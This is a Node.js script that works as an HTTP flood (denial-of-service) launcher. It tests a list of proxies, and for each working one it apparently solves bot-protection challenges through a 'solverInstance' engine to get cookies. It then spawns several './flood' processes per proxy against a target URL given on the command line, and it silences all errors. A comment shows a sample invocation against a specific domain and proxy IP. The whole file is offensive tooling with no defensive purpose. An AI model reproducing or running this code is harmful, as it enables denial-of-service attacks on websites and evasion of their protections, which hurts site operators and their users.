process.on('uncaughtException', function(er) {
    // console.log(er);
});
process.on('unhandledRejection', function(er) {
    // console.log(er);
});

require('events').EventEmitter.defaultMaxListeners = 0;

const { solverInstance } = require('./engine');
const { spawn } = require('child_process');

const fs = require('fs');
const colors = require('colors');
const request = require("request");
const validProxies = [];

const urlT = process.argv[2];
const timeT = process.argv[3];
const sessT = process.argv[4];

const Ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0'
const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');

function randPrx() {
	return proxies[Math.floor(Math.random() * proxies.length)];
}

function log(string) {
	let d = new Date();
	let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
	let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
	let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
	console.log(`(${hours}:${minutes}:${seconds}) ${string}`);
}

function check_proxy(proxy) {
	request({
		url: "https://google.com/",
		proxy: "http://" + proxy,
		headers: {
			'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
		}
	}, (err, res, body) => {
		if (!err) {
			validProxies.push(proxy);
			log(`[info]`.yellow + ` Added new proxy: `.blue + ` ${proxy}`.green);
		}
	});
}

function flooder(cookie, e) {

	for (let i = 0; i < 4; i++) {
		//./flood https://dststx.xyz "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0" 300 "coco" GET 3000 213.238.182.19:3128
		const sus = spawn('./flood', [urlT, "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0", timeT, cookie, "GET", "3000", e])
	
		sus.stdout.on('data', (data) => {
            // console.log(`${data}`);
        });
	}
}

async function sessionIn() {
	validProxies.forEach((e) => {
			solverInstance({
				"Target": urlT,
				"Proxy": e
		}).then((cookie, _) => {
			log('[info]'.yellow + ` Flooder started -> ${cookie} -> ${e}`.green);
			flooder(cookie, e)
		}).catch((ee) => {
			log(ee);
		})
	})
}

function main() {
	proxies.forEach((e) => {
		check_proxy(e);
	})

	setTimeout(() => {
		return sessionIn();
	}, 15 * 1000);
}

main();

setTimeout(() => {
    process.exit(0);
    process.exit(0);
    process.exit(0);
}, timeT * 1000)

// sessionIn();